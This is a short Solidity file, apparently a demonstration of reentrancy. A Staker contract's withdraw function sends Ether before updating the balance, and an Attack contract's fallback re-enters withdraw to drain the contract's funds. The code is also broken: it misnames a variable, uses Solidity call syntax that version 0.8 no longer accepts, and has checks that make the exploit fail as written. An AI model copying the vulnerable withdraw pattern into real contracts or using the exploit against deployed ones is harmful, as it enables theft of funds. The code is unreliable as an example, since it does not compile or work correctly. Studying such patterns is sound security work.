

pragma solidity ^0.8.0;

contract Staker {
    mapping (address => uint256) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value; 
    }

    function withdraw(uint256 _amount) public {
        require(_amount < balances[msg.sender]);

        (bool success, )= msg.sender.call{value:_amount}(""); 
        require(success, "failure to send");

        balances[msg.sender] -= _amount; 
    }
}

contract Attack {
    Staker public stakerInstance; 

    constructor (address payable _stakerInstance) public {
        stakerInstance = Staker(_stakerInstance);
    }

    fallback() external payable {
        if (address(stakerInstance).balance >=0 ){
            stakerInstance.withdraw(address(stakerInstance).balance);
        }
    }

    function attack(address payable _stakerInstance) public payable {
        uint256 amount = msg.value;
        stakeInstance.deposit.value(amount)();
        stakeInstance.withdraw(amount);
    }
}
